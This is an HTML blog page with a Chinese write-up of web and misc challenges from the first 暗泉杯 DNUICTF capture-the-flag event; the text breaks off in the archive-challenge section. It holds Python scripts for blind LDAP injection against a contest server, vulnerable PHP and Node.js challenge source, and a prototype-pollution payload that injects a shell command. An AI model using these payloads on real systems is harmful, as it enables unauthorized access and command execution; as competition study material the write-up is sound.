@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%9A%97%E6%B3%89%E6%9D%AF%20DNUICTF/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%9A%97%E6%B3%89%E6%9D%AF%20DNUICTF/","path":"2023/12/25/第一届暗泉杯 DNUICTF/","title":"第一届暗泉杯 DNUICTF"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>第一届暗泉杯 DNUICTF | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag"><span class="nav-text">flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#odd-upload"><span class="nav-text">odd_upload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Easyinject"><span class="nav-text">Easyinject</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hideandseek-x"><span class="nav-text">Hideandseek(x)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dirtyrce-x"><span class="nav-text">dirtyrce(x)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#wschat-x"><span class="nav-text">wschat(x)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NssShop"><span class="nav-text">NssShop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B4%A0%E6%95%B0"><span class="nav-text">素数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="nav-text">压缩包</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E4%BE%A0"><span class="nav-text">键盘侠</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%9A%97%E6%B3%89%E6%9D%AF%20DNUICTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="第一届暗泉杯 DNUICTF | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          第一届暗泉杯 DNUICTF
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>加油！</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/8054e880cb554a708034c88b380b885e.png"></p>
+<a id="more"></a>
+
+<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>签到题目</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/9a743ea9e46545a389676a98137ebc2f.png"></p>
+<p>ZmxhZ3tuc3NfbG9naW592 base64</p>
+<h1 id="odd-upload"><a href="#odd-upload" class="headerlink" title="odd_upload"></a>odd_upload</h1><ul>
+<li>smarty模板</li>
+</ul>
+<p>题目首页知道用到了smarty模板，同时可以上传文件</p>
+<p>根据文档  <code>https://www.smarty.net/docs/zh_CN/installing.smarty.basic.tpl</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/6212cbd3dbed4a3c97d0d0684e18934e.png"></p>
+<p><code>上传路径可控</code></p>
+<p>向 <code>/templates/</code> 传一个 <code>index.tpl</code> 来控制 <code>index.php显示内容</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/308fac0f939d4268a66676aa78fa3712.png"><br>接下来smarty注入，利用 <code>if</code> 标签</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/dad67d0a975c4e78bbc1563ae0bbe601.png"></p>
+<h1 id="Easyinject"><a href="#Easyinject" class="headerlink" title="Easyinject"></a>Easyinject</h1><ul>
+<li>LDAP注入</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/8033af9770cc46cc8b70044369707f9e.png"><br>尝试 <code>guest</code> <code>EC77k8RHquAMLKAX</code> 登录</p>
+<p>发现hint: </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_</span><br></pre></td></tr></table></figure>
+
+<p>尝试正常的sql注入</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/e9c88858ae954f388ca4ea255308bb9d.png"></p>
+<p>出现ldap_search():</p>
+<p>尝试 <code>ldap注入</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/53301c7e77e943e7966fbfd7b0904c12.png"></p>
+<p>根据登录为 <code>用户名或者邮箱</code> 猜测后台应该是这样的语句</p>
+<p><code> (   &amp;(pass=xxxx) (| (user=g*) (mail=l*)    )</code></p>
+<p>那么整体思路就是通过设置username为一个不存在，构造例如</p>
+<p><code>&#39;user=a*)(mail=*&amp;pass=EC77k8RHquAMLKAX&#39;</code></p>
+<p>然后当后面的匹配对象 <code>存在且唯一</code> 时返回 <code>密码错误</code>，当 <code>存在但是对象不唯一</code> 时返回 <code>查找用户不唯一</code></p>
+<p>再具体爆破不唯一的下一个字母，来确定存在的对象</p>
+<p>Ldap最主要的是 <code>找对attributes</code>，这道题我就是因为<code>缺少ldap的字典</code>导致进度极其缓慢，最后在搜索<code>attributes</code>时，终于发现一个奇怪的邮箱属性 <code>rfc822mailbox</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/2525714acfc446fbbe1d024ecb706934.png"><br>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://47.106.172.144:2333/?&#x27;</span></span><br><span class="line">str1 = <span class="string">&#x27;0123456789@_.&#x27;</span></span><br><span class="line"></span><br><span class="line">username,done = <span class="string">&#x27;o&#x27;</span>,<span class="literal">False</span></span><br><span class="line"><span class="comment"># ldaptset4t4wt    sdf  nss orange  yunwei</span></span><br><span class="line"></span><br><span class="line">mail = <span class="string">&#x27;n&#x27;</span></span><br><span class="line"><span class="comment"># laeaf@nss.moe  guest@nss.moe  nss@nss.moe  ldaptest@test.com</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;r&#x27;</span></span><br><span class="line"><span class="comment"># dsff  example  groups  rbgsfg   // ldaptset4t4wt   sdf orange nss</span></span><br><span class="line"></span><br><span class="line">cn = <span class="string">&#x27;l&#x27;</span></span><br><span class="line"><span class="comment">#guest sdf nss orange  ldaptset4t4wt</span></span><br><span class="line"></span><br><span class="line">rfc822mailbox = <span class="string">&#x27;ldapl&#x27;</span></span><br><span class="line"><span class="comment"># nss@nss.moe  laeaf@nss.moe</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> ascii_lowercase+str1:</span><br><span class="line">            <span class="comment">#payload = &#x27;user=&#x27;+username+j+&#x27;*))%00&amp;pass=EC77k8RHquAMLKAX&#x27;  #用户名</span></span><br><span class="line">            <span class="comment">#payload = &#x27;user=a*)(mail=&#x27;+mail+j+&#x27;*&amp;pass=EC77k8RHquAMLKAX&#x27;  #邮箱</span></span><br><span class="line">            payload = <span class="string">&#x27;user=a*)(rfc822mailbox=&#x27;</span> + rfc822mailbox + j + <span class="string">&#x27;*&amp;pass=EC77k8RHquAMLKAX&#x27;</span></span><br><span class="line">            <span class="comment">#payload = &#x27;user=a*)(cn=&#x27; + cn + j + &#x27;*&amp;pass=EC77k8RHquAMLKAX&#x27;</span></span><br><span class="line">            print(payload)</span><br><span class="line">            r = requests.get(url=url+payload)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                rfc822mailbox +=j</span><br><span class="line">                <span class="comment">#username +=j</span></span><br><span class="line">                print(rfc822mailbox)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            done = <span class="literal">True</span></span><br><span class="line">print(rfc822mailbox)</span><br></pre></td></tr></table></figure>
+<p><code>https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html</code></p>
+<p>整理好字典！！！</p>
+<p>但是看wp好像是直接注出来的，无所谓了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://47.106.172.144:2333/&quot;</span></span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>(<span class="params">flag</span>):</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="comment"># print(flag+c+&#x27;*&#x27;)</span></span><br><span class="line">        r = requests.get(url, params=&#123;<span class="string">&#x27;user&#x27;</span>:flag+c+<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;找不到用户&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;查询用户不唯一&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># print(c+&#x27;\n&#x27;+r.text)</span></span><br><span class="line">            print(flag+c)</span><br><span class="line">            search(flag+c)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;Error: [&#x27;</span>+c+<span class="string">&#x27;]\n&#x27;</span>+r.text)</span><br><span class="line">search(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Hideandseek-x"><a href="#Hideandseek-x" class="headerlink" title="Hideandseek(x)"></a>Hideandseek(x)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//docker </span></span><br><span class="line"><span class="comment">//FROM php:8.1.0</span></span><br><span class="line"><span class="comment">//disable_functions=exec,shell_exec,system,passthru,popen,proc_open,putenv,getenv,pcntl_exec,fputs,fwrite,pcntl_fork,pcntl_waitpid,pcntl_setpriority,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_sigprocmask</span></span><br><span class="line"><span class="comment">//disable_classes = FFI</span></span><br><span class="line"><span class="comment">//chmod -R  0555 html/</span></span><br><span class="line"><span class="comment">//php -S 0.0.0.0:8000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$flag</span>=file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);<span class="comment">//看到这个flag了吗 (°▽°)ノ✿</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;看来你失败了&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>);<span class="comment">//我把它覆盖了都不给你 （￣▽￣）</span></span><br><span class="line">test();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;eval&#x27;</span>]);<span class="comment">//来试试读flag吧 只有一次机会哦 执行结束flag真的会消失的说 重启容器间隔会很长时间呢 本地试好了再来试试吧 (〜￣△￣)〜 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;eval&quot;</span>]))&#123;</span><br><span class="line">main();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<h1 id="dirtyrce-x"><a href="#dirtyrce-x" class="headerlink" title="dirtyrce(x)"></a>dirtyrce(x)</h1><p>hint: 代码有一个判断非常奇怪 如何利用这个判断呢 注意题目名称</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var express &#x3D; require(&#39;express&#39;);</span><br><span class="line">var nodeCmd &#x3D; require(&#39;node-cmd&#39;);</span><br><span class="line">var bodyParser &#x3D; require(&#39;body-parser&#39;);</span><br><span class="line">const app &#x3D; express();</span><br><span class="line">var router &#x3D; express.Router();</span><br><span class="line">const port &#x3D; 80;</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;</span><br><span class="line">	extended: true</span><br><span class="line">&#125;)).use(bodyParser.json());</span><br><span class="line">function isValidIP(ip) &#123;</span><br><span class="line">	var reg &#x3D; &#x2F;^(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])$&#x2F;;</span><br><span class="line">	return reg.test(ip);</span><br><span class="line">&#125;</span><br><span class="line">app.post(&quot;&#x2F;ping&quot;,</span><br><span class="line">function(req, res, next) &#123;</span><br><span class="line"></span><br><span class="line">	b &#x3D; req.body.cmd;</span><br><span class="line">	if (req.body.ping &#x3D;&#x3D;&#x3D; undefined) &#123;  &#x2F;&#x2F; ping参数</span><br><span class="line">		res.send(&#39;invalid parm&#39;);</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	ping &#x3D; req.body.ping</span><br><span class="line">	if (ping.time !&#x3D;&#x3D; undefined) &#123;    &#x2F;&#x2F; ping[time]</span><br><span class="line">		time &#x3D; Number(ping.time);</span><br><span class="line">		if (time &gt; 10 || time &lt; 1) &#123;   &#x2F;&#x2F;  1&lt;time&lt;10  </span><br><span class="line">			res.send(&#39;invalid time&#39;);</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">		if (Object.keys(ping).length !&#x3D; 1 &amp;&amp; ping.ip !&#x3D;&#x3D; undefined &amp;&amp; ping.ip !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">			if (!isValidIP(ping.ip)) &#123;</span><br><span class="line">				res.send(&#39;invalid ip addr&#39;);</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		res.send(&#39;need time parm&#39;);</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	ip &#x3D; ((ping.ip !&#x3D;&#x3D; undefined &amp;&amp; ping.ip !&#x3D; &#39;&#39;) ? ping.ip: &#39;114.114.114.114&#39;);</span><br><span class="line">	nodeCmd.run(&#39;ping -c &#39; + time + &#39; &#39; + ip, &#x2F;&#x2F;WINDOWS USE -n</span><br><span class="line">	function(err, data, stderr) &#123;</span><br><span class="line">		res.send(data);</span><br><span class="line">		return;</span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">app.get(&#39;&#x2F;&#39;,</span><br><span class="line">function(req, res, next) &#123;</span><br><span class="line">	res.redirect(&#39;index&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;index&#39;,</span><br><span class="line">function(req, res, next) &#123;</span><br><span class="line">	res.send(&#39;&lt;title&gt;ping test&lt;&#x2F;title&gt;&lt;form action&#x3D;&quot;&#x2F;ping&quot; method&#x3D;&quot;POST&quot;&gt;Ip:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;ping[ip]&quot;&quot; placeholder&#x3D;&quot;default value 114 dns&quot;&gt;&lt;br&gt;Times:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;ping[time]&quot;  value&#x3D;&quot;1&quot;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping !&quot;&gt;&lt;&#x2F;form&gt; &#39;);</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure>
+<p>对IP的参数限制的死死的，nodejs的rce不知道是绕过还是模板的漏洞</p>
+<p>写的时候想多了，原来就是一个原型污染</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/2f55ca9a4f7e4be58a6dcbad9bfdde0a.png"></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping[__proto__][ip]&#x3D;| calc &amp;ping[time]&#x3D;10</span><br></pre></td></tr></table></figure>
+
+<p>直接污染原型就行了</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/27dea2f39f8943e086e8ba0bf8d9028e.png"></p>
+<h1 id="wschat-x"><a href="#wschat-x" class="headerlink" title="wschat(x)"></a>wschat(x)</h1><ul>
+<li>sqlite注入</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/HBohan/article/details/120672745">SQLite 数据库注入总结</a></p>
+<p>一个 nodejs+sqllite写的轻量聊天室 x)</p>
+<p>hint: 非常现代的协议 非常简单的注入 最简单的工具就是浏览器<br>hint: 有什么简单的方法可以单独把前端校验去掉呢</p>
+<p>两个功能注册，登录 还有个聊天的面板，发送的消息显示，提示sqli</p>
+<p>wp</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/65024c7e8908438a9cdf25d58c8934e4.png"><br><a target="_blank" rel="noopener" href="https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/#wschat">or4nge战队题解</a></p>
+<h1 id="NssShop"><a href="#NssShop" class="headerlink" title="NssShop"></a>NssShop</h1><p>整数溢出</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/c16cec740ebc44aab55ce8a81ac8b96f.png"></p>
+<h1 id="素数"><a href="#素数" class="headerlink" title="素数"></a>素数</h1><p>请您选出10个1024位以上的大素数提交给我</p>
+<p>py:</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> p == <span class="number">2</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    m, k, = p - <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> m % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        m, k = m // <span class="number">2</span>, k + <span class="number">1</span></span><br><span class="line">    a = randint(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line">    x = <span class="built_in">pow</span>(a, m, p)</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">or</span> x == p - <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span> k &gt; <span class="number">1</span>:</span><br><span class="line">        x = <span class="built_in">pow</span>(x, <span class="number">2</span>, p)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> x == p - <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        k = k - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_prime</span>(<span class="params">p, r = <span class="number">40</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        <span class="keyword">if</span> miller_rabin(p) == <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    T = time.perf_counter()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        index = <span class="number">1024</span></span><br><span class="line">        print(index, <span class="string">&quot;位质数: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index):</span><br><span class="line">            num = num * <span class="number">2</span> + randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">while</span> is_prime(num) == <span class="literal">False</span>:</span><br><span class="line">            num = num + <span class="number">1</span></span><br><span class="line">        print(num)</span><br><span class="line">        print(<span class="string">&quot;----------------------------&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;用时：&quot;</span>, time.perf_counter() - T)</span><br></pre></td></tr></table></figure>
+
+<h1 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h1><p>压缩包套娃，里面的压缩包名字为解压密码</p>
+<p>py:</p>
